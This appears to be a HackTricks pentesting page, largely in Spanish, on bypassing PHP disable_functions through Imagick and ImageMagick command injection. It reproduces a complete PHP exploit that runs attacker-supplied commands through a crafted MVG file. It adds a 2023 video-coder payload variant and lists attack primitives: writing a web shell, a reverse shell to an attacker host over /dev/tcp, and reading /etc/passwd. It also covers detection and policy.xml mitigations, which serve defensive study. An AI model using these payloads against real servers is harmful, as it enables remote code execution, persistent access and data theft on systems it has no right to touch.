# Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass

{{#include ../../../../banners/hacktricks-training.md}}

> La conocida familia de errores *ImageTragick* (CVE-2016-3714 y otros) permite a un atacante acceder al binario subyacente de **ImageMagick** a través de entradas MVG/SVG manipuladas. Cuando la extensión PHP **Imagick** está presente, esto puede ser abusado para ejecutar comandos de shell incluso si todas las funciones PHP orientadas a la ejecución están en la lista negra con `disable_functions`.
>
> El PoC original publicado por RicterZ (Chaitin Security Research Lab) en mayo de 2016 se reproduce a continuación. La técnica se encuentra regularmente durante auditorías contemporáneas de PHP 7/8 porque muchos proveedores de alojamiento compartido simplemente compilan PHP sin `exec`/`system` pero mantienen una combinación desactualizada de Imagick + ImageMagick.

From <http://blog.safebuff.com/2016/05/06/disable-functions-bypass/>
```php
# Exploit Title : PHP Imagick disable_functions bypass
# Exploit Author: RicterZ  (ricter@chaitin.com)
# Versions      : Imagick <= 3.3.0  |  PHP >= 5.4
# Tested on     : Ubuntu 12.04 (ImageMagick 6.7.7)
# Usage         : curl "http://target/exploit.php?cmd=id"
<?php
// Print the local hardening status
printf("Disable functions: %s\n", ini_get("disable_functions"));
$cmd = $_GET['cmd'] ?? 'id';
printf("Run command: %s\n====================\n", $cmd);

$tmp   = tempnam('/tmp', 'pwn');     // will hold command output
$mvgs  = tempnam('/tmp', 'img');     // will hold malicious MVG script

$payload = <<<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/x.jpg"|$cmd >$tmp")'
pop graphic-context
EOF;

file_put_contents($mvgs, $payload);
$img = new Imagick();
$img->readImage($mvgs);     // triggers convert(1)
$img->writeImage(tempnam('/tmp', 'img'));
$img->destroy();

echo file_get_contents($tmp);
?>
```
---

## ¿Por qué funciona?

1. `Imagick::readImage()` genera de manera transparente el binario *delegate* de **ImageMagick** (`convert`/`magick`).
2. El script MVG establece el *fill* a una URI externa. Cuando se inyecta una comilla doble (`"`), el resto de la línea es interpretado por `/bin/sh ‑c` que ImageMagick utiliza internamente → ejecución arbitraria de shell.
3. Todo ocurre fuera del intérprete de PHP, por lo tanto, *`disable_functions`*, *open_basedir*, `safe_mode` (eliminado en PHP 5.4) y restricciones similares en el proceso son completamente eludidas.

## Estado 2025 – **sigue** siendo relevante

* Cualquier versión de Imagick que dependa de un backend vulnerable de ImageMagick sigue siendo explotable. En pruebas de laboratorio, la misma carga útil funciona en PHP 8.3 con **Imagick 3.7.0** y **ImageMagick 7.1.0-51** compilado sin un `policy.xml` endurecido.
* Desde 2020 se han encontrado varios vectores adicionales de inyección de comandos (`video:pixel-format`, `ps:`, `text:` coders…). Dos ejemplos públicos recientes son:
* **CVE-2020-29599** – inyección de shell a través del codificador *text:*.
* **GitHub issue #6338** (2023) – inyección en el *video:* delegate.

Si el sistema operativo incluye ImageMagick < **7.1.1-11** (o 6.x < **6.9.12-73**) sin un archivo de política restrictivo, la explotación es sencilla.

## Variantes modernas de carga útil
```php
// --- Variant using the video coder discovered in 2023 ---
$exp = <<<MAGICK
push graphic-context
image over 0,0 0,0 'vid:dummy.mov" -define video:pixel-format="rgba`uname -a > /tmp/pwned`" " dummy'
pop graphic-context
MAGICK;
$img = new Imagick();
$img->readImageBlob($exp);
```
Otras primitivas útiles durante CTFs / compromisos reales:

* **Escritura de archivos**  – `... > /var/www/html/shell.php`  (escribir web-shell fuera de *open_basedir*)
* **Shell inverso** – `bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"`
* **Enumerar** – `id; uname -a; cat /etc/passwd`

## Detección y enumeración rápida
```bash
# PHP side
php -r 'echo phpversion(), "\n"; echo Imagick::getVersion()["versionString"], "\n";'

# System side
convert -version | head -1                 # ImageMagick version
convert -list policy | grep -iE 'mvg|https|video|text'   # dangerous coders still enabled?
```
Si la salida muestra que los codificadores `MVG` o `URL` están *habilitados*, es probable que el objetivo sea explotable.

## Mitigaciones

1. **Parchear/Actualizar**  – Utilice ImageMagick ≥ *7.1.1-11* (o la última versión 6.x LTS) e Imagick ≥ *3.7.2*.
2. **Fortalecer `policy.xml`**  – *deshabilitar* explícitamente los codificadores de alto riesgo:

```xml
<policy domain="coder" name="MVG" rights="none"/>
<policy domain="coder" name="MSL" rights="none"/>
<policy domain="coder" name="URL" rights="none"/>
<policy domain="coder" name="VIDEO" rights="none"/>
<policy domain="coder" name="PS" rights="none"/>
<policy domain="coder" name="TEXT" rights="none"/>
```

3. **Eliminar la extensión**  en entornos de hosting no confiables. En la mayoría de las pilas web, `GD` o `Imagick` no son estrictamente necesarios.
4. Trate `disable_functions` solo como *defensa en profundidad* – nunca como un mecanismo de sandboxing primario.

## Referencias

* [GitHub ImageMagick issue #6338 – Command injection via video:pixel-format (2023)](https://github.com/ImageMagick/ImageMagick/issues/6338)
* [CVE-2020-29599 – ImageMagick shell injection via text: coder](https://nvd.nist.gov/vuln/detail/CVE-2020-29599)
{{#include ../../../../banners/hacktricks-training.md}}
